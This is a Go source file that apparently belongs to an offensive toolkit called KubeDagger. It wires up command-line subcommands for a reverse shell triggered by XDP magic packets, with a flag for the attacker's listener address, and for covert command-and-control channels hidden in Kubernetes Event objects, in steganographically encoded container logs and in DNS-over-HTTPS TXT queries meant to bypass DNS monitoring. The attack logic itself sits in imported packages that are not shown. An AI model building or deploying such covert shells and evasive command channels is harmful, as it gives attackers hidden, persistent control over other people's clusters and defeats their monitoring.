package run

import (
	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/bpf_ipc"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/container_log_c2"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/doh_c2"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_event_c2"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/xdp_shell"
)

var cmdXDPShell = &cobra.Command{
	Use:   "xdp-shell",
	Short: "XDP reverse shell",
	Long:  "xdp-shell spawns a reverse shell triggered by crafted XDP magic packets",
	RunE:  xdpShellCmd,
}

var cmdBPFIPC = &cobra.Command{
	Use:   "bpf-ipc",
	Short: "BPF map IPC",
	Long:  "bpf-ipc enables inter-program communication via BPF maps for coordinated operations",
	RunE:  bpfIPCCmd,
}

var cmdK8sEventC2 = &cobra.Command{
	Use:   "k8s-event-c2",
	Short: "K8s Event C2",
	Long:  "k8s-event-c2 uses Kubernetes Event objects as a covert command-and-control channel",
	RunE:  k8sEventC2Cmd,
}

var cmdContainerLogC2 = &cobra.Command{
	Use:   "container-log-c2",
	Short: "Container log C2",
	Long:  "container-log-c2 hides C2 data steganographically in container stdout/stderr logs",
	RunE:  containerLogC2Cmd,
}

var cmdDoHC2 = &cobra.Command{
	Use:   "doh-c2",
	Short: "DNS-over-HTTPS C2",
	Long:  "doh-c2 routes C2 traffic through DoH TXT record queries to bypass DNS monitoring",
	RunE:  dohC2Cmd,
}

func xdpShellCmd(cmd *cobra.Command, args []string) error {
	return xdp_shell.Execute(options.Target, options.XDPShellConnect, options.XDPShellProtocol, options.Output)
}

func bpfIPCCmd(cmd *cobra.Command, args []string) error {
	return bpf_ipc.Execute(options.Target, options.BPFIPCAction, options.BPFIPCChannel, options.BPFIPCMessage, options.Output)
}

func k8sEventC2Cmd(cmd *cobra.Command, args []string) error {
	return k8s_event_c2.Execute(options.Target, options.K8sC2Namespace, options.K8sC2Beacon, options.Output)
}

func containerLogC2Cmd(cmd *cobra.Command, args []string) error {
	return container_log_c2.Execute(options.Target, options.LogC2Container, options.LogC2Encoding, options.Output)
}

func dohC2Cmd(cmd *cobra.Command, args []string) error {
	return doh_c2.Execute(options.Target, options.DoHC2Resolver, options.DoHC2Domain, options.Output)
}

func init() {
	cmdXDPShell.PersistentFlags().StringVar(
		&options.XDPShellConnect,
		"connect",
		"",
		"attacker listener address (ip:port) for reverse shell")
	cmdXDPShell.PersistentFlags().StringVar(
		&options.XDPShellProtocol,
		"protocol",
		"tcp",
		"shell protocol: tcp or icmp")
	cmdXDPShell.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdXDPShell)

	cmdBPFIPC.PersistentFlags().StringVar(
		&options.BPFIPCAction,
		"action",
		"send",
		"IPC action: send, recv, or list")
	cmdBPFIPC.PersistentFlags().StringVar(
		&options.BPFIPCChannel,
		"channel",
		"default",
		"BPF map channel name")
	cmdBPFIPC.PersistentFlags().StringVar(
		&options.BPFIPCMessage,
		"message",
		"",
		"message payload for send action")
	cmdBPFIPC.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdBPFIPC)

	cmdK8sEventC2.PersistentFlags().StringVar(
		&options.K8sC2Namespace,
		"namespace",
		"default",
		"namespace for K8s Event C2 channel")
	cmdK8sEventC2.PersistentFlags().StringVar(
		&options.K8sC2Beacon,
		"beacon",
		"30s",
		"beacon interval for check-in")
	cmdK8sEventC2.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdK8sEventC2)

	cmdContainerLogC2.PersistentFlags().StringVar(
		&options.LogC2Container,
		"container",
		"",
		"target container name for log-based C2")
	cmdContainerLogC2.PersistentFlags().StringVar(
		&options.LogC2Encoding,
		"encoding",
		"base85",
		"encoding scheme: base85, whitespace, or unicode")
	cmdContainerLogC2.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdContainerLogC2)

	cmdDoHC2.PersistentFlags().StringVar(
		&options.DoHC2Resolver,
		"resolver",
		"cloudflare",
		"DoH resolver: cloudflare, google, or custom URL")
	cmdDoHC2.PersistentFlags().StringVar(
		&options.DoHC2Domain,
		"domain",
		"",
		"authoritative domain for C2 TXT record queries")
	cmdDoHC2.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdDoHC2)
}
